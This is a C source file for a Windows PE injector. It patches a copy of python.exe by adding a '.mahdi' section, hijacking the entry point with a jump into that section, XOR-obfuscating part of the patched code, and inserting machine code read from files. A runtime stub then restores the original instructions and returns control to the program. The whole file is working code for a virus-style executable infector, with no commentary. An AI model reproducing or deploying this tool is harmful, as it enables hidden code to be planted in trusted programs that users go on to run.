#include "windows.h"
#include "stdio.h"
#include "string.h"

#define IMAGE_FILE_EXPORT_DIRECTORY		0
#define IMAGE_FILE_IMPORT_DIRECTORY		1
#define IMAGE_FILE_RESOURCE_DIRECTORY		2
#define IMAGE_FILE_EXCEPTION_DIRECTORY		3
#define IMAGE_FILE_SECURITY_DIRECTORY		4
#define IMAGE_FILE_BASE_RELOCATION_TABLE	5
#define IMAGE_FILE_DEBUG_DIRECTORY		6
#define IMAGE_FILE_DESCRIPTION_STRING		7
#define IMAGE_FILE_MACHINE_VALUE		8  
#define IMAGE_FILE_THREAD_LOCAL_STORAGE		9
#define IMAGE_FILE_CALLBACK_DIRECTORY		10

struct MyFileReader {
	unsigned char* buff;
	int fileSize;
};

struct ParsedPE {
	unsigned char* buff;
	int fileSize;
	struct _IMAGE_DOS_HEADER* _image_dos_header;
	struct _IMAGE_NT_HEADERS* _image_nt_headers;
	struct _IMAGE_FILE_HEADER* _image_file_header;
	WORD number_of_sections;
	WORD* ptr_number_of_sections;
	WORD size_of_optional_header;
	struct _IMAGE_OPTIONAL_HEADER* _image_optional_header;
	DWORD size_of_code;
	DWORD size_of_initialized_data;
	DWORD size_of_uninitialized_data;
	DWORD address_of_entry_point;
	DWORD* ptr_address_of_entry_point;
	DWORD base_of_code;
	DWORD file_alignment;
	DWORD section_alignment;
	DWORD* size_of_image;
	struct _IMAGE_DATA_DIRECTORY  *image_data_directories[16];
	struct _IMAGE_SECTION_HEADER* _image_section_header;
	struct _IMAGE_SECTION_HEADER**_image_section_headers;
	DWORD res;
	_IMAGE_EXPORT_DIRECTORY * _image_export_directory;
	_IMAGE_IMPORT_DESCRIPTOR * _image_import_descriptor;
	_IMAGE_RESOURCE_DIRECTORY * _image_resource_directory;
	_IMAGE_DEBUG_DIRECTORY * _image_debug_directory;
	int number_of_image_import_descriptors = 0;
};

struct MyFileReader myReadFile(char * file_name);
BOOL myWriteFile(unsigned char * buff, int file_size);
DWORD myRVAtoRRaw(DWORD VA1, _IMAGE_SECTION_HEADER**_image_section_headers, int sectionNum);
DWORD fixAlignment(DWORD address, DWORD alignmentSize);
struct ParsedPE parsePE(MyFileReader result_of_read_file);
ParsedPE addSection(ParsedPE parsed_pe);

void myEncrypt(unsigned char* cursor, int numberOfByte, BYTE cesar) {
	for (int i = 0; i < numberOfByte; i++) {
		*(cursor + i) = *(cursor + i) xor cesar;
	}
}

int main(int argc, char *argv[])
{
	ParsedPE parsed_pe = parsePE(myReadFile((char *)"W:\\python.exe"));
	MyFileReader transitional;
	int size_to_added = 1024;
	unsigned char* buff2 = (unsigned char *)realloc(parsed_pe.buff, parsed_pe.fileSize + size_to_added);
	transitional.buff = buff2; 
	transitional.fileSize = parsed_pe.fileSize + size_to_added; 
	ParsedPE injected_pe = parsePE(transitional);
	injected_pe = addSection(injected_pe);
	myWriteFile(injected_pe.buff, injected_pe.fileSize);
	getchar();
	return 0;
}

ParsedPE addSection(ParsedPE parsed_pe) {
	printf("start the add section function \n");
	parsed_pe._image_section_headers[0]->Characteristics = parsed_pe._image_section_headers[0]->Characteristics | 0x80000000; //change text section to writeable
	_IMAGE_SECTION_HEADER* last_image_section_header = (_IMAGE_SECTION_HEADER*)parsed_pe._image_section_headers[parsed_pe.number_of_sections - 1];
	_IMAGE_SECTION_HEADER* new_image_section_header = (_IMAGE_SECTION_HEADER*)(last_image_section_header + 1);
	new_image_section_header->VirtualAddress = fixAlignment(last_image_section_header->VirtualAddress + (last_image_section_header->Misc.VirtualSize), parsed_pe.section_alignment);
	new_image_section_header->PointerToRawData = fixAlignment(last_image_section_header->PointerToRawData + last_image_section_header->SizeOfRawData, parsed_pe.file_alignment);
	memcpy(&new_image_section_header->Name[0], &".mahdi", 6);
	new_image_section_header->SizeOfRawData = 0x00000200;
	new_image_section_header->Misc.VirtualSize = 0x00000200;
	new_image_section_header->PointerToRelocations = 0x00000000;
	new_image_section_header->PointerToLinenumbers = 0x00000000;
	new_image_section_header->NumberOfRelocations = 0x00AA;
	new_image_section_header->NumberOfLinenumbers = 0x00AA;
	new_image_section_header->Characteristics = 0x60000020;
	DWORD new_size_of_imaege = fixAlignment(new_image_section_header->VirtualAddress + new_image_section_header->Misc.VirtualSize, parsed_pe.section_alignment);
	DWORD virtual_address_old_entry_point = parsed_pe.address_of_entry_point;
	int size_of_jump = 5;
	//in this code we change the first instruction of old entry point to jump to new entry point
	MyFileReader code1_file = myReadFile((char *)"W:\\code1.sam");
	int removed_ins_size = code1_file.fileSize + size_of_jump;
	unsigned char * removed_instructions = (unsigned char *)malloc(removed_ins_size * sizeof(char));
	DWORD relative_raw_address_of_entry_point = myRVAtoRRaw(virtual_address_old_entry_point, parsed_pe._image_section_headers, parsed_pe.number_of_sections);
	memcpy(removed_instructions, parsed_pe.buff + relative_raw_address_of_entry_point, removed_ins_size);
	unsigned char* cursor_to_old_entry_point = (unsigned char *)(parsed_pe.buff + relative_raw_address_of_entry_point);
	memcpy(cursor_to_old_entry_point, (code1_file.buff), code1_file.fileSize);
	cursor_to_old_entry_point = cursor_to_old_entry_point + code1_file.fileSize;
	*cursor_to_old_entry_point = 0xE9;
	cursor_to_old_entry_point++;
	int temp3 = new_image_section_header->VirtualAddress - (virtual_address_old_entry_point + code1_file.fileSize + size_of_jump);
	memcpy(cursor_to_old_entry_point, &temp3, 4); // number of bytes that must jump over them
	cursor_to_old_entry_point = cursor_to_old_entry_point + 4;
	int size_to_encrypt = 10;
	BYTE key = 0x03;
	myEncrypt(cursor_to_old_entry_point, size_to_encrypt, key);
	unsigned char * new_image_section = (unsigned char*)(parsed_pe.buff + new_image_section_header->PointerToRawData);
	unsigned char * cursor_to_new_image_section = (unsigned char *)(parsed_pe.buff + new_image_section_header->PointerToRawData);
	MyFileReader injecting_file = myReadFile((char *)"W:\\injected_machine_code.sam");
	memcpy(cursor_to_new_image_section, (injecting_file.buff), injecting_file.fileSize);
	cursor_to_new_image_section = cursor_to_new_image_section + injecting_file.fileSize;
	*cursor_to_new_image_section = 0x83; //sub 
	cursor_to_new_image_section++; 
	*cursor_to_new_image_section = 0xEB; //ebx
	cursor_to_new_image_section++;
	*cursor_to_new_image_section = 0x06; //6
	cursor_to_new_image_section++;
	for (int i = 0; i < removed_ins_size; i++) {
		*cursor_to_new_image_section = 0xC6; //mov
		cursor_to_new_image_section++;
		*cursor_to_new_image_section = 0x03; // [ebx]
		cursor_to_new_image_section++;
		*cursor_to_new_image_section = *removed_instructions;
		removed_instructions++;
		cursor_to_new_image_section++;
		*cursor_to_new_image_section = 0x43; // inc ebx
		cursor_to_new_image_section++;
	}

	MyFileReader decrypt_file = myReadFile((char *)"W:\\decrypt.sam");
	memcpy(cursor_to_new_image_section, (decrypt_file.buff), decrypt_file.fileSize);
	unsigned char * edit_cursor = cursor_to_new_image_section;
	edit_cursor = cursor_to_new_image_section + 5;
	memcpy(edit_cursor, &size_to_encrypt, 4);
	edit_cursor = cursor_to_new_image_section + 12;
	memcpy(edit_cursor, &key, 1);
	cursor_to_new_image_section = cursor_to_new_image_section + decrypt_file.fileSize;


	*cursor_to_new_image_section = 0xE9; //jmp
	cursor_to_new_image_section++;
	DWORD va_tahe_jump = new_image_section_header->VirtualAddress + (cursor_to_new_image_section - new_image_section + 4);
	int temp2 = virtual_address_old_entry_point - va_tahe_jump;
	memcpy(cursor_to_new_image_section, &temp2, 4);
	*parsed_pe.ptr_number_of_sections = *parsed_pe.ptr_number_of_sections + 1;
	*parsed_pe.size_of_image = new_size_of_imaege;
	MyFileReader transitional;
	transitional.buff = parsed_pe.buff;
	transitional.fileSize = parsed_pe.fileSize;
	ParsedPE result = parsePE(transitional);
	printf("end the add section function \n");
	return result;
}

BOOL myWriteFile(unsigned char * buff, int file_size) { 
	DWORD dwBytesWrite;
	HANDLE hFile = CreateFile("W:\\mython.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		printf("failure on write file\n");
	BOOL a = WriteFile(hFile, buff, file_size, &dwBytesWrite, NULL);
	CloseHandle(hFile);
	return a;
}  

struct MyFileReader myReadFile(char * file_name) {
	DWORD dwBytesRead;
	HANDLE hFile = CreateFile(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	int fileSize = (int)GetFileSize(hFile, NULL);
	printf("%d", fileSize);
	if (hFile == INVALID_HANDLE_VALUE)
		printf("Could not open !!.\n");
	else
		printf("opened successfully.\n");
	unsigned char* buff = (unsigned char*)malloc(fileSize);
	BOOL a = ReadFile(hFile, buff, fileSize, &dwBytesRead, NULL);
	struct MyFileReader result;
	result.buff = buff;
	result.fileSize = fileSize;
	CloseHandle(hFile);
	return result;
}

DWORD myRVAtoRRaw(DWORD VA1, _IMAGE_SECTION_HEADER**_image_section_headers, int sectionNum) {
	int i = 0;
	int my_section_number = 0 ;
	for (; i < sectionNum; i++) {
		if (_image_section_headers[i]->VirtualAddress > VA1) {
			my_section_number = i - 1;
			break;
		}
	}
	DWORD debug1 =_image_section_headers[my_section_number]->VirtualAddress;
	DWORD result = VA1 - _image_section_headers[my_section_number]->VirtualAddress + _image_section_headers[my_section_number]->PointerToRawData;
	return result;
}

DWORD fixAlignment(DWORD address, DWORD alignmentSize) {
	DWORD rem = address % alignmentSize;
	DWORD result;
	if (rem != 0)
		result = address - rem + alignmentSize;
	else
		result = address;
	return result;
}

struct ParsedPE parsePE(MyFileReader result_of_read_file) {
	struct ParsedPE result;
	result.buff = result_of_read_file.buff;
	result.fileSize = result_of_read_file.fileSize;
	result._image_dos_header = (struct _IMAGE_DOS_HEADER*) result.buff;
	result._image_nt_headers = (struct _IMAGE_NT_HEADERS*) (result.buff + result._image_dos_header->e_lfanew);
	result._image_file_header = (struct _IMAGE_FILE_HEADER*) &(result._image_nt_headers->FileHeader);
	result.number_of_sections = result._image_file_header->NumberOfSections;
	result.ptr_number_of_sections = &result._image_file_header->NumberOfSections;
	result.size_of_optional_header = result._image_file_header->SizeOfOptionalHeader;
	result._image_optional_header = (struct _IMAGE_OPTIONAL_HEADER*) &(result._image_nt_headers->OptionalHeader);
	result.size_of_code = result._image_optional_header->SizeOfCode;
	result.size_of_initialized_data = result._image_optional_header->SizeOfInitializedData;
	result.size_of_uninitialized_data = result._image_optional_header->SizeOfUninitializedData;
	result.address_of_entry_point = result._image_optional_header->AddressOfEntryPoint;
	result.ptr_address_of_entry_point = &result._image_optional_header->AddressOfEntryPoint;
	result.base_of_code = result._image_optional_header->BaseOfCode;
	result.file_alignment = result._image_optional_header->FileAlignment;
	result.section_alignment = result._image_optional_header->SectionAlignment;
	result.size_of_image = &result._image_optional_header->SizeOfImage;
	result.image_data_directories[16];
	for (int i = 0; i < 16; i++)
		result.image_data_directories[i] = (_IMAGE_DATA_DIRECTORY*)& result._image_optional_header->DataDirectory[i];
	result._image_section_header = (struct _IMAGE_SECTION_HEADER*) ((DWORD)result._image_optional_header + result.size_of_optional_header);
	result._image_section_headers = (struct _IMAGE_SECTION_HEADER **) malloc(result.number_of_sections * sizeof(_IMAGE_SECTION_HEADER));
	for (int i = 0; i < result.number_of_sections; i++) {
		result._image_section_headers[i] = result._image_section_header + i;
	}
	if (result.image_data_directories[IMAGE_FILE_EXPORT_DIRECTORY]->Size != 0 & result.image_data_directories[IMAGE_FILE_EXPORT_DIRECTORY]->VirtualAddress != 0) {
		result._image_export_directory = (_IMAGE_EXPORT_DIRECTORY *)(result.buff + myRVAtoRRaw(result.image_data_directories[IMAGE_FILE_EXPORT_DIRECTORY]->VirtualAddress, result._image_section_headers, result.number_of_sections));
	}
	if (result.image_data_directories[IMAGE_FILE_IMPORT_DIRECTORY]->Size != 0 & result.image_data_directories[IMAGE_FILE_IMPORT_DIRECTORY]->VirtualAddress != 0) {
		result._image_import_descriptor = (_IMAGE_IMPORT_DESCRIPTOR *)(result.buff + myRVAtoRRaw(result.image_data_directories[IMAGE_FILE_IMPORT_DIRECTORY]->VirtualAddress, result._image_section_headers, result.number_of_sections));
	}
	if (result.image_data_directories[IMAGE_FILE_RESOURCE_DIRECTORY]->Size != 0 & result.image_data_directories[IMAGE_FILE_RESOURCE_DIRECTORY]->VirtualAddress != 0) {
		result._image_resource_directory = (_IMAGE_RESOURCE_DIRECTORY *)(result.buff + myRVAtoRRaw(result.image_data_directories[IMAGE_FILE_RESOURCE_DIRECTORY]->VirtualAddress, result._image_section_headers, result.number_of_sections));
	}
	if (result.image_data_directories[IMAGE_FILE_DEBUG_DIRECTORY]->Size != 0 & result.image_data_directories[IMAGE_FILE_DEBUG_DIRECTORY]->VirtualAddress != 0) {
		result._image_debug_directory = (_IMAGE_DEBUG_DIRECTORY *)(result.buff + myRVAtoRRaw(result.image_data_directories[IMAGE_FILE_DEBUG_DIRECTORY]->VirtualAddress, result._image_section_headers, result.number_of_sections));
	}
	_IMAGE_IMPORT_DESCRIPTOR* current_image_import_descriptor;
	int number_of_image_import_descriptors = 0;
	for (int i = 0; ; i++) {
		current_image_import_descriptor = result._image_import_descriptor + i;
		if (current_image_import_descriptor->Name == NULL)
			break;
		number_of_image_import_descriptors++;
	}
	_IMAGE_IMPORT_DESCRIPTOR**  _image_import_descriptors = (_IMAGE_IMPORT_DESCRIPTOR **)malloc(number_of_image_import_descriptors * sizeof(_IMAGE_IMPORT_DESCRIPTOR));
	for (int i = 0; i < number_of_image_import_descriptors; i++) {
		_image_import_descriptors[i] = result._image_import_descriptor + i;
	}
	return result;
}